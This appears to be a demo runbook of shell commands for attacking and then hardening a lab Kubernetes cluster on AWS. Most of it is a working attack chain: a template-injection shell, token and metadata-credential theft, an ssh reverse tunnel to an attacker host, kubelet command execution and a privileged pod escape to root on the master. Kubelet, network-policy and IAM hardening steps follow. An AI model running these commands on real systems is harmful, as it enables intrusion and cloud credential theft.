@@ -1,0 +1,322 @@
+# Create Cluster
+./kubeatf create-cluster kops-1.7.0-aws
+
+# Show all nodes
+kubectl get nodes -o wide
+
+# Install dashboard
+kubectl create -f https://raw.githubusercontent.com/kubernetes/kubernetes/master/cluster/addons/dashboard/dashboard-controller.yaml
+kubectl create -f https://raw.githubusercontent.com/kubernetes/kubernetes/master/cluster/addons/dashboard/dashboard-service.yaml
+
+# Show all pods
+kubectl get pods --all-namespaces
+
+---
+# Audit Cluster
+./kubeatf audit-cluster kops-1.7.0-aws | less
+
+--- 
+# Install Vulnapp
+vi vulnapp-dep.yml
+kubectl create -f vulnapp-dep.yml
+vi vulnapp-svc-aws.yml
+kubectl create -f vulnapp-svc-aws.yml
+
+# Install Voting App
+vi azure-vote.yml
+kubectl create -f azure-vote.yml
+
+# Show Apps
+kubectl get pods
+kubectl get svc -o wide
+
+---
+# Exploit Vulnapp
+curl http://a4b72d9d8ba0211e7801a06d2c9432f2-1327035484.us-east-1.elb.amazonaws.com:8000/page?name=Brad
+./tplmap.py -u http://a4b72d9d8ba0211e7801a06d2c9432f2-1327035484.us-east-1.elb.amazonaws.com:8000/page?name=Brad --os-shell
+---
+# Exec into pod
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+# Install tools
+apt-get update -q && DEBIAN_FRONTEND=noninteractive apt-get install -qy less jq iputils-ping nmap vim python-pip groff-base tcpdump curl && pip install awscli
+
+# Install kubectl
+curl -sLO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin
+
+# Hit API Server
+curl -sk https://$KUBERNETES_PORT_443_TCP_ADDR:443
+
+# Use default SA token
+ls -al /var/run/secrets/kubernetes.io/serviceaccount
+cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d"." -f2 | base64 -d
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get secrets --all-namespaces | grep default
+kubectl get secret -n kube-system default-token-ww2zp -o yaml
+echo "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKa1pXWmhkV3gwTFhSdmEyVnVMWGQzTW5wd0lpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVibUZ0WlNJNkltUmxabUYxYkhRaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTFhV1FpT2lKa05ERTNOekpoWXkxaU9XWmtMVEV4WlRjdFlXRXpNeTB3Tm1ReVl6azBNekptTWpnaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZhM1ZpWlMxemVYTjBaVzA2WkdWbVlYVnNkQ0o5LmRSbGp6RDRiazRSVU5rTFZ0MUtWcllKcWF2OHFQS3FCU3RGOFVzSmlRQTFoQ0FXU3JOeEM5YUlZVWlDMWNscnFqQTlJcC1yX3M2RDMwRHRsVEFBcHc4TS00VmlBT2pSLXFMaGxVcEo2Nl9ScTBmdnpqSXV4am5oQkRlRDJoX0wtTmJfU1JUc2sxdzQ4R1BCM21sNmc2eVAxTXp2dHExeXpyNWZySVZkWWFuMnlLNk84c3ZERU9HbnFCdmxlT3NuVW8xSEpUaUE2Tl8tVkRuRGRHN1gxRm8teFlVUV8xRWY1d2xZRVBHZmJDWE0zaTdXT0xTZk1IalZhbkVpeXdjeGI3TmdSeVRERVI0N21ybzNnb3J4WHgycXBzRnQ3ZVZNSXZsakZzMzk2MWtDMVZwaFRIYm9WdTZDWjBaM1poRTROSXpOZGltZlo3OGJlakhNbVBHazNUQQ==" | base64 -d | cut -d"." -f2 | base64 -d
+
+---
+# Hit Dashboard
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+curl -sk http://kubernetes-dashboard.kube-system
+ping kubernetes-dashboard.kube-system
+ssh -R8000:100.66.61.239:80 baduser@mybadip.com
+
+---
+# Show metrics
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+kubectl get nodes -o wide
+curl -sk http://172.20.42.228:4194/metrics | less
+curl -sk http://172.20.42.228:4194/metrics | grep dockerVersion
+curl -sk http://172.20.42.228:4194/metrics | grep running
+
+---
+# Locate voting app
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+apt install netcat
+
+kubectl get pods -o wide
+kubectl get svc
+nmap -n -T5 -p 6379 -Pn 100.65.29.230
+
+# Install redis-cli
+apt install redis-tools
+
+# Tamper with voting app
+redis-cli -h 100.65.29.230
+keys *
+set cats 1000
+
+---
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+# Get worker node IP
+kubectl get pods -o wide
+ping -c1 172.20.48.188
+curl -sk https://172.20.48.188:10250/
+curl -sk https://172.20.48.188:10250/runningpods/
+curl -sk https://172.20.48.188:10250/runningpods/ > allpods
+vi allpods
+/azure
+:q!
+
+# Show kubelet-exploit worker
+curl -sk https://172.20.48.188:10250/run/default/azure-vote-front-1874756303-c3s69/azure-vote-front -d "cmd=ls -al /"
+
+---
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+# Hit metadata API to get user-data
+curl -sk http://169.254.169.254/latest/user-data
+curl -sk http://169.254.169.254/latest/user-data | less
+
+aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/
+aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/secrets
+aws s3 cp s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/secrets/admin .
+aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/pki/
+aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/pki/private/
+aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/pki/private/ca/
+
+---
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+# Hit metadata API to get IAM creds
+curl -sk http://169.254.169.254/latest/meta-data/
+
+# Show IAM credentials
+curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/nodes.kube.lonimbus.com
+
+# Get user-data from all other instances
+aws ec2 --region us-east-1 describe-instances
+aws ec2 describe-regions --region us-east-1 --query 'Regions[].RegionName' | jq '.[]' | awk -F'"' '{print $2}' > regions
+
+vi regions
+
+for i in $(cat regions); do
+  aws ec2 --region ${i} describe-instances | jq -r ' .Reservations[].Instances[] | [ .VpcId, .InstanceId, .Placement.AvailabilityZone, .PublicDnsName, .SecurityGroups[].GroupName, .PublicIpAddress, .PrivateIpAddress, .InstanceType] | @csv' | tee -a instances.csv
+done
+
+vi instances.csv
+
+for r in $(cat regions); do
+  for i in $(cat instances.csv | grep "\"${r}" | awk -F\" '{print $4}'); do
+    aws ec2 --region ${r} describe-instance-attribute --instance-id ${i} --attribute userData | jq '.UserData.Value' | tr -d \" | base64 -d > ${i}-userdata.txt
+  done
+done
+
+ls *.txt
+
+cat i-09c9c706043a20f04-userdata.txt
+
+---
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+# Get master IP
+kubectl get nodes -o yaml
+/master
+
+# Show kubelet-exploit master
+curl -sk https://172.20.57.249:10250/runningpods/
+curl -sk https://172.20.57.249:10250/run/kube-system/kube-apiserver-ip-172-20-57-249.ec2.internal/kube-apiserver -d "cmd=ls /"
+
+curl -sk https://172.20.57.249:10250/run/kube-system/kube-apiserver-ip-172-20-57-249.ec2.internal/kube-apiserver -d "cmd=wget"
+
+curl -sk https://172.20.57.249:10250/run/kube-system/kube-apiserver-ip-172-20-57-249.ec2.internal/kube-apiserver -d "cmd=wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+curl -sk https://172.20.57.249:10250/run/kube-system/kube-apiserver-ip-172-20-57-249.ec2.internal/kube-apiserver -d "cmd=wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.kube.lonimbus.com"
+
+curl -sk https://172.20.57.249:10250/run/kube-system/kube-apiserver-ip-172-20-57-249.ec2.internal/kube-apiserver -d "cmd=wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.kube.lonimbus.com" > master.json
+
+export AWS_REGION=us-east-1
+export AWS_ACCESS_KEY_ID=$(cat master.json | grep AccessKeyId | cut -d'"' -f4)
+export AWS_SECRET_ACCESS_KEY=$(cat master.json | grep SecretAccessKey | cut -d'"' -f4)
+export AWS_SESSION_TOKEN=$(cat master.json | grep Token | cut -d'"' -f4)
+
+aws ec2 help
+aws ec2 get-password-data
+
+---
+kubectl exec -it vulnweb-2569941405-q8v9r /bin/bash
+export TERM=xterm
+
+export KUBEMASTER="$(kubectl get nodes -l 'kubernetes.io/role=master' | tail -1 | awk '{print $1}')"
+kubectl taint nodes $KUBEMASTER node-role.kubernetes.io/master:NoSchedule-
+cat > masterpod.yml << EOF
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nginx
+  namespace: kube-system
+  labels:
+    env: prod
+spec:
+  hostNetwork: true
+  containers:
+  - name: nginx
+    image: nginx
+    securityContext:
+      privileged: true
+    volumeMounts:
+      - name: rootfs
+        mountPath: /rootfs
+  volumes:
+    - name: rootfs
+      hostPath:
+        path: /
+  nodeSelector:
+    kubernetes.io/hostname: $KUBEMASTER
+EOF
+
+kubectl apply -f masterpod.yml
+kubectl exec nginx --namespace kube-system -it /bin/bash
+
+chroot /rootfs /bin/bash
+id
+
+
+---
+# Kube2iam
+vi kube2iam.yml
+
+kubectl exec -it vulnweb-2569941405-v80tt /bin/bash
+export TERM=xterm
+clear
+
+curl -sk http://169.254.169.254/latest/user-data
+exit
+
+kubectl create -f kube2iam.yml
+kubectl get pods --all-namespaces | grep iam
+
+kubectl exec -it vulnweb-2569941405-v80tt /bin/bash
+export TERM=xterm
+clear
+
+curl -sk http://169.254.169.254/latest/user-data
+curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/nodes.kube.lonimbus.com
+aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com
+exit
+
+kubectl delete -f kube2iam.yml
+
+kubectl exec -it vulnweb-2569941405-v80tt /bin/bash
+export TERM=xterm
+clear
+
+curl -sk http://169.254.169.254/latest/user-data
+curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/nodes.kube.lonimbus.com
+
+---
+# Block dashboard
+
+kubectl get pod -l 'k8s-app=kubernetes-dashboard' -n kube-system -o yaml | less
+/label
+
+kubectl exec -it vulnweb-2569941405-v80tt /bin/bash
+export TERM=xterm
+clear
+
+curl -sk http://kubernetes-dashboard.kube-system
+exit
+
+kubectl annotate ns kube-system net.beta.kubernetes.io/network-policy='{"ingress": {"isolation": "DefaultDeny"}}'
+
+kubectl get networkpolicy --all-namespaces
+vi allow-dns.yml
+kubectl create -f allow-dns.yml
+kubectl get networkpolicy --all-namespaces
+
+kubectl exec -it vulnweb-2569941405-v80tt /bin/bash
+export TERM=xterm
+clear
+
+ping kubernetes-dashboard.kube-system
+curl -sk http://kubernetes-dashboard.kube-system
+exit
+
+--
+# Protect kubelet
+ssh admin@54.175.73.175
+sudo bash
+
+curl -sk https://localhost:10250/runningpods/
+
+vi /etc/sysconfig/kubelet
+ 
+--anonymous-auth=false --authorization-mode=Webhook --tls-cert-file=/srv/kubernetes/server.cert --tls-private-key-file=/srv/kubernetes/server.key --client-ca-file=/srv/kubernetes/ca.crt
+
+service kubelet restart
+
+curl -sk https://localhost:10250/runningpods/
+
+exit
+exit
+
+---
+# RBAC
+ssh admin@52.91.151.221
+sudo bash
+vi /etc/kubernetes/manifests/kube-apiserver.manifest
+/Alwa
+
+
+
+
+
+
+
+
